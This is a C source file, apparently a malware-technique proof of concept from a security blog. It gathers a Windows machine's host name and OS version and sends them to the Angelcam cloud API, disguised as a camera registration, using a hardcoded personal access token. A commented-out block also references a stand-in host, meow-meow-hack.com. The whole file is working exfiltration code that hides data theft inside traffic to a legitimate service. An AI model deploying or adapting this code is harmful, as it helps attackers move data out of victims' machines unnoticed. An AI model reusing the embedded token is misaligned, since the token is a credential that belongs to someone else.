/*
 * hack.c
 * sending systeminfo via legit cloud API (Angelcam PoC)
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2025/10/31/malware-tricks-54.html
*/

#include <windows.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include <stdio.h>
 
// Angelcam personal access token
#define API_KEY "5761d5ebfc1c58d0f3bd6989911074a45a111efe"
 
int sendToAngelcam(const char* name) {
  HINTERNET hSession = WinHttpOpen(L"MeowMeowAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return 1;
 
  HINTERNET hConnect = WinHttpConnect(hSession, L"api.angelcam.com",
                          INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/v1/cameras/",
                             NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), 
    "{\"name\": \"%s\", \"type\": \"h264\", \"connection_type\": \"direct\", \"url\": \"rtsp://127.0.0.1\"}",
    name);

  char authHeader[512];

  snprintf(authHeader, sizeof(authHeader), "Authorization: PersonalAccessToken %s", API_KEY);

  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);
 
  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0);
  WinHttpReceiveResponse(hRequest, NULL);
 
  // get response (checking)
  WinHttpReceiveResponse(hRequest, NULL);

  DWORD bytesRead;
  char buffer[2048];
 
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
 
  return 0;
}
 
int main() {
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);
 
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);
 
  char buffer[512];
  snprintf(buffer, sizeof(buffer), "Host:%s OS:%d.%d.%d",
        hostName,
        osVersion.dwMajorVersion,
        osVersion.dwMinorVersion,
        osVersion.dwBuildNumber);
 
  // wchar_t json[1024];
  // swprintf(json, 1024, L"{\"name\": \"%S\", \"type\": \"h264\", \"connection_type\": \"direct\", \"url\": \"rtsp://127.0.0.1\"}", buffer);
 
  // construct the request body
  // char json_body[1024];
  // snprintf(json_body, sizeof(json_body), 
  //   "{\"description\": \"%s\", \"url\": \"https://meow-meow-hack.com/\", \"active\": true, "
  //       "\"secret\": \"this_is_a_really_bad_secret\", \"events\": [\"repo:push\", \"issue:created\"]}",
  //   description);

  // DWORD bytesRead;
  // char buffer[2048];

  int r = sendToAngelcam(buffer);
  if (r == 0) {
    printf("systeminfo successfully sent to Angelcam as 'camera'.\n");
  } else {
    printf("failed to send systeminfo to Angelcam.\n");
  }
 
  return 0;
}
 
